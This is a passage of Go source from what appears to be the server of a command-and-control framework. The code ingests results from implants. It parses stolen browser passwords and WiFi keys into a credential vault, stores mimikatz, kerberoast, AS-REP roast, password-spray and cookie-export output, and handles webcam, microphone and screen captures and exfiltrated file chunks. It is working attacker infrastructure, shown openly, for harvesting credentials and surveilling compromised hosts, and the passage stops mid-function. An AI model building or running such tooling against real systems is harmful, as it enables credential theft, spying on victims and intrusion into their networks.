package server

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/r0si/sovereign/internal/db"
	"github.com/r0si/sovereign/internal/plugin"
	"github.com/r0si/sovereign/pkg/protocol"
	"gorm.io/gorm"
)

// ── Task result ingest ────────────────────────────────────────────────────

// vaultNoteError counts a vault crypto failure for observability. Callers use
// it alongside fail-closed handling (drop output, never store plaintext).
func (s *Server) vaultNoteError(op string, err error, taskID uint, agentID string) {
	if s.metrics != nil && s.metrics.VaultErrorsTotal != nil {
		s.metrics.VaultErrorsTotal.WithLabelValues(op).Inc()
	}
	slog.Error("Vault crypto failure", "op", op, "task_id", taskID, "agent_id", agentID, "err", err)
}

// encryptTaskFieldsOrBlank encrypts a task copy's Result/Error for storage.
// Fail-closed: on vault failure the output is dropped and replaced with a
// vault-error marker so secrets never land in the DB as plaintext.
// encryptTaskFieldsFn is the vault call behind encryptTaskFieldsOrBlank. It is a
// var so the fail-closed branch can be tested: InitLootEncryption deliberately
// never clears an existing key (stored loot must stay decryptable), so a test
// cannot make the real vault unavailable once the suite has initialised it.
var encryptTaskFieldsFn = func(task *db.Task) error { return task.EncryptTaskFields() }

func (s *Server) encryptTaskFieldsOrBlank(task *db.Task) error {
	if err := encryptTaskFieldsFn(task); err != nil {
		task.Result = ""
		task.Error = "vault encryption unavailable"
		s.vaultNoteError("encrypt-result", err, task.ID, task.AgentID)
		return err
	}
	return nil
}

// taskResultTailCap bounds the streaming tail persisted for a running task
// so a chatty long-running command cannot grow the DB without limit. The
// final result overwrites this wholesale on completion.
const taskResultTailCap = 64 << 10

// appendTaskResultTail appends one partial chunk to the task's stored output,
// keeping at most the last taskResultTailCap bytes.
func appendTaskResultTail(task *db.Task, chunk string) {
	combined := task.Result + chunk
	if len(combined) > taskResultTailCap {
		combined = combined[len(combined)-taskResultTailCap:]
	}
	task.Result = combined
}

// decodeTaskResult normalizes a beacon result for storage: base64 text
// outputs are decoded, while binary-carrying types (file transfers,
// media captures) keep their base64. Decoding binary JPEG/WAV into a Go
// string corrupts it at JSON marshal time (invalid UTF-8 becomes U+FFFD),
// so the console could never render webcam/mic captures otherwise.
// Pure so it stays unit-testable.
func decodeTaskResult(taskType, encoding, output string) string {
	if encoding == "base64" && output != "" {
		switch taskType {
		case "upload", "download", "webcam", "mic":
			return output
		}
		if decoded, err := base64.StdEncoding.DecodeString(output); err == nil {
			return string(decoded)
		}
	}
	return output
}

// applyStructuredTaskResult preserves the recon/collection side effects that
// used to be reachable only through forgeable operator callbacks. The caller
// has already authenticated the beacon, matched the task to its agent, claimed
// a live task and persisted the final result exactly once.
func (s *Server) applyStructuredTaskResult(agent db.Implant, task db.Task, r taskResult, now time.Time) {
	if task.Status != "completed" || r.Type != task.Type {
		return
	}
	switch task.Type {
	case "portscan":
		s.ingestPortscanResult(agent, task, now)
	case "browser_steal":
		s.ingestBrowserCredentialResult(agent, task)
	case "wifi_creds":
		s.ingestWifiCredentialResult(agent, task)
	case "lateral":
		s.ingestLateralHostResult(task, now)
	}
}

func formatPrivescStructuredResult(result string) string {
	trimmed := strings.TrimSpace(result)
	if !strings.HasPrefix(trimmed, "{") {
		return result
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal([]byte(trimmed), &fields); err != nil {
		return result
	}
	if _, ok := fields["os"]; !ok {
		if _, vulns := fields["vulnerabilities"]; !vulns {
			if _, misconfigs := fields["misconfigurations"]; !misconfigs {
				if _, suggestions := fields["suggestions"]; !suggestions {
					return result
				}
			}
		}
	}
	var payload struct {
		OS              string `json:"os"`
		Vulnerabilities []struct {
			CVE         string `json:"cve"`
			Title       string `json:"title"`
			Description string `json:"description"`
			Severity    string `json:"severity"`
		} `json:"vulnerabilities"`
		Misconfigurations []struct {
			Title       string `json:"title"`
			Description string `json:"description"`
			Severity    string `json:"severity"`
		} `json:"misconfigurations"`
		Suggestions []string `json:"suggestions"`
	}
	if err := json.Unmarshal([]byte(trimmed), &payload); err != nil {
		return result
	}

	var out strings.Builder
	out.WriteString("=== Privilege Escalation Check Results ===\n\n")
	fmt.Fprintf(&out, "OS: %s\n\n", payload.OS)
	fmt.Fprintf(&out, "Found %d potential vulnerabilities:\n", len(payload.Vulnerabilities))
	for i, vuln := range payload.Vulnerabilities {
		fmt.Fprintf(&out, "%d. [%s] %s - %s (CVE: %s)\n", i+1, vuln.Severity, vuln.Title, vuln.Description, vuln.CVE)
	}
	fmt.Fprintf(&out, "\nFound %d misconfigurations:\n", len(payload.Misconfigurations))
	for i, misconfig := range payload.Misconfigurations {
		fmt.Fprintf(&out, "%d. [%s] %s - %s\n", i+1, misconfig.Severity, misconfig.Title, misconfig.Description)
	}
	out.WriteString("\nSuggestions:\n")
	for i, suggestion := range payload.Suggestions {
		fmt.Fprintf(&out, "%d. %s\n", i+1, suggestion)
	}
	return out.String()
}

func (s *Server) ingestPortscanResult(agent db.Implant, task db.Task, now time.Time) {
	protocolName := strings.ToLower(strings.TrimSpace(task.Shell))
	if protocolName != "udp" {
		protocolName = "tcp"
	}
	target := ""
	allowedTargets := make(map[string]struct{})
	if parts := strings.SplitN(task.Command, ":", 2); len(parts) == 2 {
		for _, candidate := range strings.Split(parts[0], ",") {
			candidate = strings.TrimSpace(candidate)
			if candidate != "" {
				allowedTargets[candidate] = struct{}{}
			}
		}
		if len(allowedTargets) == 1 {
			for candidate := range allowedTargets {
				target = candidate
			}
		}
	}

	var rows []db.ScanResult
	seen := make(map[string]struct{})
	addRow := func(targetIP string, port int, protocol, state string) {
		if port < 1 || port > 65535 || protocol == "" || state == "" {
			return
		}
		key := fmt.Sprintf("%s\x00%d\x00%s", targetIP, port, protocol)
		if _, ok := seen[key]; ok {
			return
		}
		seen[key] = struct{}{}
		rows = append(rows, db.ScanResult{
			AgentID: agent.ID, TaskID: task.ID, TargetIP: targetIP,
			Port: port, Protocol: protocol, State: state, CreatedAt: now,
		})
	}

	trimmed := strings.TrimSpace(task.Result)
	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
		var payload struct {
			Results []string `json:"results"`
		}
		if err := json.Unmarshal([]byte(trimmed), &payload); err != nil {
			var list []string
			if err := json.Unmarshal([]byte(trimmed), &list); err != nil {
				return
			}
			payload.Results = list
		}
		for _, raw := range payload.Results {
			parts := strings.Split(raw, ":")
			if len(parts) < 3 {
				continue
			}
			port, err := strconv.Atoi(strings.TrimSpace(parts[0]))
			if err != nil {
				continue
			}
			row := db.ScanResult{
				AgentID: agent.ID, TaskID: task.ID, TargetIP: target,
				Port: port, Protocol: strings.TrimSpace(parts[1]), State: strings.TrimSpace(parts[2]), CreatedAt: now,
			}
			if len(parts) > 3 {
				row.Service = parts[3]
			}
			if len(parts) > 4 {
				row.Version = parts[4]
			}
			if len(parts) > 5 {
				row.Banner = strings.Join(parts[5:], ":")
			}
			if row.Port < 1 || row.Port > 65535 || row.Protocol == "" || row.State == "" {
				continue
			}
			key := fmt.Sprintf("%s\x00%d\x00%s", row.TargetIP, row.Port, row.Protocol)
			if _, ok := seen[key]; ok {
				continue
			}
			seen[key] = struct{}{}
			rows = append(rows, row)
		}
	} else {
		for _, line := range strings.Split(task.Result, "\n") {
			fields := strings.Fields(strings.TrimSpace(line))
			if len(fields) < 2 {
				continue
			}
			host, portText, err := net.SplitHostPort(fields[0])
			if err != nil {
				continue
			}
			if _, ok := allowedTargets[host]; !ok {
				continue
			}
			port, err := strconv.Atoi(portText)
			if err != nil {
				continue
			}
			state := strings.ToLower(fields[1])
			if state != "open" && state != "closed" {
				continue
			}
			addRow(host, port, protocolName, state)
		}
	}
	if len(rows) == 0 {
		return
	}
	if err := s.db.CreateInBatches(rows, 500).Error; err != nil {
		slog.Error("Failed to persist beacon scan results", "agent_id", agent.ID, "task_id", task.ID, "error", err)
	}
}

func browserCredentialNotes(result string) []string {
	trimmed := strings.TrimSpace(result)
	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
		var payload struct {
			Credentials []string `json:"credentials"`
		}
		if err := json.Unmarshal([]byte(trimmed), &payload); err == nil && payload.Credentials != nil {
			return payload.Credentials
		}
		var list []string
		if err := json.Unmarshal([]byte(trimmed), &list); err == nil {
			return list
		}
		return nil
	}

	var notes []string
	var url, username, password string
	flush := func() {
		if url != "" && username != "" {
			notes = append(notes, strings.Join([]string{"browser", url, username, password, ""}, "|"))
		}
		url, username, password = "", "", ""
	}
	for _, line := range strings.Split(result, "\n") {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)
		switch {
		case strings.HasPrefix(lower, "url:"):
			url = strings.TrimSpace(trimmed[len("url:"):])
		case strings.HasPrefix(lower, "user:"):
			username = strings.TrimSpace(trimmed[len("user:"):])
		case strings.HasPrefix(lower, "pass:"):
			password = strings.TrimSpace(trimmed[len("pass:"):])
		case trimmed == "---":
			flush()
		case strings.HasPrefix(lower, "browser|") && strings.Count(trimmed, "|") >= 3:
			notes = append(notes, trimmed)
		}
	}
	flush()
	return notes
}

func wifiCredentialPairs(result string) [][2]string {
	trimmed := strings.TrimSpace(result)
	if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
		var payload struct {
			Networks []string `json:"networks"`
		}
		if err := json.Unmarshal([]byte(trimmed), &payload); err == nil && payload.Networks != nil {
			return parseWifiNetworkStrings(payload.Networks)
		}
		var list []string
		if err := json.Unmarshal([]byte(trimmed), &list); err == nil {
			return parseWifiNetworkStrings(list)
		}
		return nil
	}

	var pairs [][2]string
	var ssid string
	for _, line := range strings.Split(result, "\n") {
		trimmed := strings.TrimSpace(line)
		if strings.HasPrefix(trimmed, "--- Profile: ") && strings.HasSuffix(trimmed, " ---") {
			ssid = strings.TrimSpace(strings.TrimSuffix(strings.TrimPrefix(trimmed, "--- Profile: "), " ---"))
			continue
		}
		lower := strings.ToLower(trimmed)
		if ssid != "" && (strings.Contains(lower, "key content") || strings.Contains(trimmed, "关键内容")) {
			if separator := strings.IndexAny(trimmed, ":："); separator >= 0 {
				password := strings.TrimSpace(trimmed[separator+1:])
				if password != "" {
					pairs = append(pairs, [2]string{ssid, password})
				}
			}
			ssid = ""
			continue
		}
		if strings.Contains(trimmed, "[NetworkManager]") {
			if start := strings.Index(trimmed, "SSID:"); start >= 0 {
				rest := trimmed[start+len("SSID:"):]
				if separator := strings.Index(rest, ", PSK:"); separator >= 0 {
					ssid = strings.TrimSpace(rest[:separator])
					password := strings.TrimSpace(rest[separator+len(", PSK:"):])
					if ssid != "" && password != "" {
						pairs = append(pairs, [2]string{ssid, password})
					}
				}
			}
		}
	}
	return pairs
}

func parseWifiNetworkStrings(networks []string) [][2]string {
	pairs := make([][2]string, 0, len(networks))
	for _, network := range networks {
		parts := strings.SplitN(network, ":", 2)
		if len(parts) != 2 {
			continue
		}
		ssid := strings.TrimSpace(parts[0])
		if ssid == "" {
			continue
		}
		pairs = append(pairs, [2]string{ssid, strings.TrimSpace(parts[1])})
	}
	return pairs
}

func (s *Server) ingestBrowserCredentialResult(agent db.Implant, task db.Task) {
	entries := make([]db.CredentialEntry, 0)
	for _, note := range browserCredentialNotes(task.Result) {
		encrypted, err := encryptCredNotes(note)
		if err != nil {
			s.vaultNoteError("encrypt-browser-notes", err, task.ID, agent.ID)
			continue
		}
		entries = append(entries, db.CredentialEntry{
			AgentID: agent.ID, Source: "browser", Type: "cleartext",
			TaskID: task.ID, Notes: encrypted, TenantID: agent.TenantID,
		})
	}
	s.storeHarvestedCredentialEntries(agent.ID, task.ID, "browser", entries)
}

func (s *Server) ingestWifiCredentialResult(agent db.Implant, task db.Task) {
	entries := make([]db.CredentialEntry, 0)
	for _, pair := range wifiCredentialPairs(task.Result) {
		entries = append(entries, db.CredentialEntry{
			AgentID: agent.ID, Username: pair[0], Password: pair[1],
			Source: "wifi", Type: "cleartext", TaskID: task.ID, TenantID: agent.TenantID,
		})
	}
	s.storeHarvestedCredentialEntries(agent.ID, task.ID, "wifi", entries)
}

func (s *Server) storeHarvestedCredentialEntries(agentID string, taskID uint, source string, entries []db.CredentialEntry) int {
	if len(entries) == 0 {
		return 0
	}
	created := 0
	if err := s.db.Transaction(func(tx *gorm.DB) error {
		for i := range entries {
			// A nested transaction isolates a rejected row (for example a vault
			// crypto failure) without aborting the whole PostgreSQL transaction.
			if err := tx.Transaction(func(rowTx *gorm.DB) error {
				return rowTx.Create(&entries[i]).Error
			}); err != nil {
				slog.Warn("Harvested credential dropped", "source", source, "agent_id", agentID, "task_id", taskID, "error", err)
				continue
			}
			created++
		}
		return nil
	}); err != nil {
		slog.Warn("Harvested credential transaction aborted", "source", source, "agent_id", agentID, "task_id", taskID, "error", err)
	}
	return created
}

func (s *Server) ingestLateralHostResult(task db.Task, now time.Time) {
	command, _, err := taskWireArgs(task)
	if err != nil {
		slog.Error("Failed to resolve lateral result arguments", "task_id", task.ID, "error", err)
		return
	}
	method, target := canonicalLateralMethodTarget(command)
	if method == "" || target == "" {
		return
	}
	services, err := json.Marshal([]map[string]interface{}{{"method": method, "port": 0}})
	if err != nil {
		slog.Error("Failed to encode lateral host service", "task_id", task.ID, "error", err)
		return
	}
	host := db.NetworkHost{AgentID: task.AgentID, IP: target}
	if err := s.db.Where("agent_id = ? AND ip = ?", task.AgentID, target).
		Assign(db.NetworkHost{Services: string(services), LastSeen: now}).
		FirstOrCreate(&host, db.NetworkHost{AgentID: task.AgentID, IP: target}).Error; err != nil {
		slog.Error("Failed to persist lateral network host", "agent_id", task.AgentID, "task_id", task.ID, "error", err)
	}
}

func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid string, now time.Time) {
	// Batch-load all referenced tasks
	taskIDs := make([]uint, 0, len(results))
	taskIDSet := make(map[uint]struct{})
	for _, r := range results {
		if r.TaskID > 0 {
			if _, ok := taskIDSet[r.TaskID]; !ok {
				taskIDs = append(taskIDs, r.TaskID)
				taskIDSet[r.TaskID] = struct{}{}
			}
		}
	}
	var loadedTasks []db.Task
	if len(taskIDs) > 0 {
		if err := s.db.Where("id IN ? AND agent_id = ?", taskIDs, strings.ToLower(uuid)).Limit(len(taskIDs)).Find(&loadedTasks).Error; err != nil {
			slog.Error("Failed to batch-load tasks", "agent_id", uuid, "error", err)
		}
	}
	taskMap := make(map[uint]*db.Task, len(loadedTasks))
	for i := range loadedTasks {
		taskMap[loadedTasks[i].ID] = &loadedTasks[i]
	}

	var pendingAudit []auditEntry
	defer func() { s.LogAuditRecords(nil, pendingAudit) }()

	for _, r := range results {
		if s.isDuplicateResult(uuid, r) {
			slog.Debug("Duplicate task result dropped", "agent_id", uuid, "task_id", r.TaskID, "type", r.Type, "rid", r.ResultID)
			continue
		}
		// Per-task key decryption (P2): if the agent sealed this result with the
		// task-issued AES-256-GCM key, recover the plaintext before further
		// processing. Failure leaves the ciphertext in place and is logged.
		if r.EncryptedWithTaskKey {
			if t, ok := taskMap[r.TaskID]; ok && t.TaskKey != "" {
				if plain, err := decryptTaskKeyOutput(t.TaskKey, r.Output); err == nil {
					r.Output = plain
					r.EncryptedWithTaskKey = false
				} else {
					slog.Warn("Per-task key decryption failed", "agent_id", uuid, "task_id", r.TaskID, "err", err)
				}
			} else {
				slog.Warn("Per-task key result with no stored key", "agent_id", uuid, "task_id", r.TaskID)
			}
		}
		if r.Type == "screen_frame" && r.Output != "" {
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
			continue
		}
		if r.Type == "screen_stream_error" {
			errorMessage := strings.TrimSpace(r.Error)
			if errorMessage == "" {
				errorMessage = strings.TrimSpace(r.Output)
			}
			if errorMessage == "" {
				errorMessage = "screen stream stopped unexpectedly"
			}
			slog.Warn("Screen stream stopped on agent", "agent_id", uuid, "error", errorMessage)
			s.BroadcastScreenMonitorError(uuid, errorMessage)
			continue
		}
		if r.Type == "screen_trigger" && r.Output != "" {
			if err := s.writeScreenshotFile(s.rawDataDir(), uuid, r.TaskID, r.Output); err != nil {
				slog.Warn("Failed to persist screen-trigger capture", "agent_id", uuid, "task_id", r.TaskID, "error", err)
			}
			s.BroadcastScreenshot(uuid, r.Output)
			continue
		}

		errMessage := truncateString(r.Error, 100)
		if r.Type == protocol.TaskTypeFileScan && errMessage != "" {
			errMessage = "[file_scan error details withheld]"
		}
		slog.Info("Processing task result", "task_id", r.TaskID, "type", r.Type, "has_output", r.Output != "", "has_error", r.Error != "", "error_message", errMessage)

		task, ok := taskMap[r.TaskID]
		if !ok {
			continue
		}
		// Finality guard (P6): a cancelled task is terminal. The agent may have
		// run the command before the abort reached it; its result must not
		// resurrect the task row. The pending slot was already released by
		// whoever cancelled the task (cancel endpoint / kill-switch disarm) —
		// decrementing here double-counted the release.
		if task.Status == "cancelled" {
			// Keep the task cancelled, but preserve what the agent actually
			// reported: the abort may have lost the race with the command.
			s.captureLateResult(task, r, uuid, now)
			continue
		}
		// Durable idempotency (P8): the agent reseeds results with the same rid
		// after a dropped frame, so an exact rid that was already applied must
		// not be applied a second time (this check survives server restarts,
		// unlike the in-memory dedup cache).
		if r.ResultID != "" && task.LastResultID == r.ResultID && (task.Status == "completed" || task.Status == "failed") {
			slog.Debug("Duplicate task result dropped (durable)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
			continue
		}
		if task.AcknowledgedAt == nil {
			acknowledgedAt := now
			task.AcknowledgedAt = &acknowledgedAt
		}

		// Streaming progress chunk: grow the stored output tail and keep the
		// task in "running". The final (non-partial) result overwrites the
		// value wholesale and runs the normal finalisation path below.
		if r.Partial {
			// Terminal-state guard: a late/retried partial chunk (fresh rid,
			// reordered delivery) must not clobber the FINAL output of an
			// already-finalised task — that destroyed e.g. completed creds
			// dumps with a 64KB tail. Only live tasks accept tails.
			switch task.Status {
			case "pending", "running", "sent":
			default:
				slog.Debug("Partial chunk dropped: task already finalised", "agent_id", uuid, "task_id", r.TaskID, "status", task.Status)
				continue
			}
			// Streaming deltas are base64 on the wire (shell output is text, so
			// decode it); the final path below uses the same normaliser. Storing
			// the encoded form made a long-running command's live tail read as
			// base64 in the console, with multibyte UTF-8 mangled at the cap.
			appendTaskResultTail(task, decodeTaskResult(r.Type, r.Encoding, r.Output))
			task.UpdatedAt = now
			if uerr := s.withBusyRetryDB("result", func() *gorm.DB {
				return s.db.Model(&db.Task{}).Where("id = ?", task.ID).
					Updates(map[string]interface{}{"result": task.Result, "updated_at": now})
			}).Error; uerr != nil {
				slog.Error("Failed to persist partial task output", "agent_id", uuid, "task_id", r.TaskID, "error", uerr)
			}
			s.broadcastTaskUpdate(uuid, *task)
			continue
		}

		// A result for a row that can no longer be claimed must not be staged or
		// written: a replayed chunk would otherwise have side effects before the
		// finality claim below discovered the task was already terminal.
		switch task.Status {
		case "pending", "running", "sent":
		default:
			slog.Debug("Result for non-live task dropped", "agent_id", uuid, "task_id", r.TaskID, "status", task.Status)
			continue
		}

		// Durable transfer sessions commit their bytes, ledger, session offset
		// and task finality in one locked pass. Skipping the generic file-chunk
		// path matters: a paused/cancelled session must never stage bytes via
		// the legacy exfil writer just because its task row is still live.
		if task.TransferID != nil && (task.Type == "upload" || task.Type == "download") {
			handled, terr := s.commitTransferChunk(agent, r, task, now)
			if handled {
				if terr != nil && !errors.Is(terr, errTransferStale) {
					slog.Warn("Transfer chunk rejected", "agent_id", uuid, "task_id", task.ID, "transfer_id", *task.TransferID, "error", terr)
				}
				if s.eventManager != nil {
					evtType := EventTaskComplete
					if task.Status == "failed" {
						evtType = EventTaskFail
					}
					s.eventManager.Emit(Event{
						Type: evtType, AgentID: uuid, AgentHost: agent.Hostname, AgentIP: agent.IP,
						TaskID: task.ID, Timestamp: now,
						Data: map[string]interface{}{"type": task.Type, "status": task.Status, "command": "file_transfer"},
					})
				}
				continue
			}
		}
		// Chunked screenshots: stage each part under the capture task id and
		// keep the task running. The server cannot render a capture that only
		// exists as chunks, so completing on the first chunk was a lie.
		if r.Type == "screenshot_chunk" && (task.Type == "screenshot" || task.Type == "screenshot_window") {
			data, derr := base64.StdEncoding.DecodeString(r.Output)
			if derr != nil {
				slog.Warn("Screenshot chunk is not valid base64", "agent_id", uuid, "task_id", task.ID, "error", derr)
				continue
			}
			if serr := s.stageScreenshotChunk(uuid, task.ID, int(r.Offset), int(r.Size), data); serr != nil {
				slog.Warn("Rejected screenshot chunk", "agent_id", uuid, "task_id", task.ID, "error", serr)
			}
			continue
		}

		// The implant signals a multi-chunk capture with this marker. Only the
		// assembled image may take the screenshot path; an incomplete set is a
		// failed task, not a completed one with no image.
		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output == "screenshot_chunked" {
			image, ok := s.takeAssembledScreenshot(task.ID)
			if !ok {
				s.dropScreenshotChunks(task.ID)
				r.Error = "screenshot chunks incomplete"
				r.Output = ""
			} else {
				r.Output = base64.StdEncoding.EncodeToString(image)
				r.Encoding = "base64"
				r.Size = int64(len(image))
			}
		}

		// File chunks are written before the terminal-state claim: a completed
		// upload/download chunk must mean the bytes are on disk. The old order
		// marked the task completed (and broadcast it) first, then recorded a
		// local write failure only in the result text.
		fileChunkHandled := false
		var fileChunkErr error
		switch {
		case r.Type == "upload" && r.Output != "":
			fileChunkHandled = true
			task.Result, fileChunkErr = s.persistFileChunk(uuid, task, r, "upload", "File chunk saved")
		case r.Type == "download" && r.Output != "" && (r.Offset > 0 || task.Offset > 0 || r.Size > 0):
			fileChunkHandled = true
			task.Result, fileChunkErr = s.persistFileChunk(uuid, task, r, "download", "Download chunk saved")
		}

		// Atomic first-final-wins claim: chunked transfers (upload/download)
		// deliver many final-shaped results per task ID. Without this guard
		// every chunk re-finalised the task and drained another pending-slot
		// from agentPendingTasks, zeroing MaxPendingTasksPerAgent and letting
		// that agent bypass the anti-flood gate entirely.
		finalStatus := "completed"
		if r.Error != "" || fileChunkErr != nil {
			finalStatus = "failed"
		}
		claim := s.withBusyRetryDB("result", func() *gorm.DB {
			return s.db.Model(&db.Task{}).
				Where("id = ? AND status IN ?", task.ID, []string{"pending", "running", "sent"}).
				Update("status", finalStatus)
		})
		if claim.Error != nil {
			slog.Error("Failed to claim task finality", "agent_id", uuid, "task_id", r.TaskID, "error", claim.Error)
			continue
		}
		if claim.RowsAffected == 0 {
			// Already terminal (duplicate/replayed result): drop silently.
			slog.Debug("Duplicate terminal result dropped (finality claim)", "agent_id", uuid, "task_id", r.TaskID, "rid", r.ResultID)
			continue
		}
		task.Status = finalStatus
		// Vault-backed work writes exactly one ledger row, even when the
		// agent re-sends the result with a fresh result id.
		if task.CredentialID != nil {
			if action, result := credentialUsageForResult(task.Type, r.Error, r.Output); action != "" {
				_ = s.recordCredentialUsageOnce(*task, action, result, "")
			}
		}
		if r.SHA256 != "" {
			task.ResultSHA256 = r.SHA256
		}
		if r.Mtime > 0 {
			task.ResultModTime = r.Mtime
		}
		if r.Error != "" {
			task.Error = r.Error
		} else if fileChunkErr != nil {
			task.Error = fileChunkErr.Error()
			task.Result = ""
		}
		task.UpdatedAt = now

		// Decrement per-agent pending task counter (delete key at zero to avoid leak) —
		// reached exactly once per task thanks to the claim above.
		s.decrementPendingTasks(uuid)
		if s.metrics != nil {
			s.metrics.TaskExecuteDuration.WithLabelValues(task.Type).Observe(now.Sub(task.CreatedAt).Seconds())
		}
		// Keep a failed chunk's poisoned chain state: resetting it here would
		// let a replay of the rejected chunk pass the zero-prev check.
		if fileChunkErr == nil {
			s.fileChains.reset(task.ID)
		}
		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
			task.Result = "processed"
			s.broadcastTaskUpdate(uuid, *task)
			if r.Type == "screen_stream_start" && task.Status == "failed" {
				s.BroadcastScreenMonitorError(uuid, task.Error)
			}
			if err := s.withBusyRetryDB("result", func() *gorm.DB {
				return s.db.Save(task)
			}).Error; err != nil {
				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
			}
			continue
		}

		// Silent task types: save result for polling but skip WebSocket broadcast
		isSilent := r.Type == "ls"

		if (r.Type == "screenshot" || r.Type == "screenshot_window") && r.Output != "" {
			slog.Info("Processing screenshot result", "agent_id", uuid, "task_id", r.TaskID)
			// Explicit operator captures are durable even while live monitoring is
			// active. Continuous screen_frame messages remain memory-only, so this
			// does not turn a live stream into unbounded disk retention.
			task.Result = r.Output
			if err := s.saveScreenshot(s.rawDataDir(), uuid, task.ID, r.Output); err != nil {
				// The capture exists only if it reached the disk; a failed write
				// is a failed task, not a completed task with an empty gallery.
				task.Status = "failed"
				task.Error = "screenshot could not be saved"
				task.Result = ""
				slog.Error("Failed to persist screenshot result", "agent_id", uuid, "task_id", task.ID, "error", err)
			}
			if s.IsScreenMonitoring(uuid) {
				s.BroadcastScreenshot(uuid, r.Output)
			}
		} else if r.Type == "file_thumb" && r.Output != "" {
			// Thumbnail bytes are written to data/thumbs and replaced with an
			// opaque id in the task result; task rows must not become an
			// alternate unbounded image store.
			task.Result = s.storeFileThumbs(uuid, r.Output)
		} else if !fileChunkHandled {
			task.Result = decodeTaskResult(r.Type, r.Encoding, r.Output)
		}

		// Enforce the max result size BEFORE any downstream parsing or
		// processing. A compromised agent could otherwise stream a multi-MB
		// blob through the regex-backed credential/kerberoast parsers below
		// before the size guard fires (previously applied only at save time).
		if r.Type != "screenshot" && r.Type != "webcam" && r.Type != "mic" && len(task.Result) > MaxResultSize {
			task.Result = truncateString(task.Result, MaxResultSize)
		}

		// Format token_list_procs results into a readable table
		if r.Type == "token_list_procs" && task.Result != "" {
			task.Result = FormatTokenProcsFromJSON(task.Result)
		}
		if r.Type == task.Type && task.Type == "privesc_check" && task.Result != "" {
			task.Result = formatPrivescStructuredResult(task.Result)
		}

		// When set_sleep succeeds, update agent's current interval/jitter
		if r.Type == "set_sleep" && task.Status == "completed" {
			parts := strings.Split(task.Command, ",")
			sleepUpdates := map[string]interface{}{}
			if len(parts) >= 1 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil && v >= 1 && v <= 86400 {
					sleepUpdates["current_interval"] = v
				}
			}
			if len(parts) >= 2 {
				if v, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil && v >= 0 && v <= 100 {
					sleepUpdates["current_jitter"] = v
				}
			}
			if len(sleepUpdates) > 0 {
				if err := s.withBusyRetryDB("result", func() *gorm.DB {
					return s.db.Model(&db.Implant{}).Where("id = ?", uuid).Updates(sleepUpdates)
				}).Error; err != nil {
					slog.Error("Failed to update sleep settings on agent", "agent_id", uuid, "error", err)
				} else {
					s.broadcastAgentDataUpdate(uuid, sleepUpdates)
					// The operator-visible sleep values are part of the delivered
					// network config; refresh on this agent's next beacon.
					s.markNetworkConfigChanged()
				}
			}
		}

		// Auto-parse credential dump results into the vault
		if r.Type == "creds" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "creds_dump"},
			})
		}

		// Auto-parse mimikatz results into the credential vault
		if r.Type == "mimikatz" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredentials(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "mimikatz"},
			})
		}

		// Auto-parse kerberoast TGS hashes into the credential vault
		if r.Type == "kerberoast" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreKerberoastResults(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "kerberoast"},
			})
		}

		// Auto-parse asreproast hashes into the credential vault
		if r.Type == "asreproast" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreASREPRoastResults(uuid, task.Result, task.ID)
			s.eventManager.Emit(Event{
				Type:      EventCredentialFound,
				AgentID:   uuid,
				AgentHost: agent.Hostname,
				AgentIP:   agent.IP,
				Timestamp: now,
				Data:      map[string]interface{}{"source": "asreproast"},
			})
		}

		// Auto-ingest valid password spray hits into the credential vault
		if r.Type == "password_spray" && task.Status == "completed" && task.Result != "" {
			if stored := s.parseAndStorePasswordSprayResults(uuid, *task, task.Result); stored > 0 {
				s.eventManager.Emit(Event{
					Type:      EventCredentialFound,
					AgentID:   uuid,
					AgentHost: agent.Hostname,
					AgentIP:   agent.IP,
					Timestamp: now,
					Data:      map[string]interface{}{"source": "password_spray", "count": stored},
				})
			}
		}

		// Confirm matching vault entries on successful credential checks
		if r.Type == "cred_check" && task.Status == "completed" && task.Result != "" {
			s.parseAndStoreCredCheckResult(uuid, *task, task.Result)
		}

		if r.Type == "cookie_export" && task.Status == "completed" && task.Result != "" {
			s.ingestCookieExport(uuid, task.Result)
		}

		// Result size cap is enforced before parsing (see above); screenshots
		// are exempt from the cap.
		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
		// `task` stays plaintext for the WebSocket broadcast and task callback
		// below, while only the persisted ciphertext differs.
		if r.ResultID != "" {
			task.LastResultID = r.ResultID
		}
		dbTask := *task
		if err := s.encryptTaskFieldsOrBlank(&dbTask); err != nil {
			// The agent executed fine but the vault is broken: fail loudly
			// (alerts fire) rather than storing the output as plaintext.
			task.Status = "failed"
		}
		if err := s.withBusyRetryDB("result", func() *gorm.DB {
			return s.db.Model(&db.Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
				"status":          task.Status,
				"result":          dbTask.Result,
				"error":           dbTask.Error,
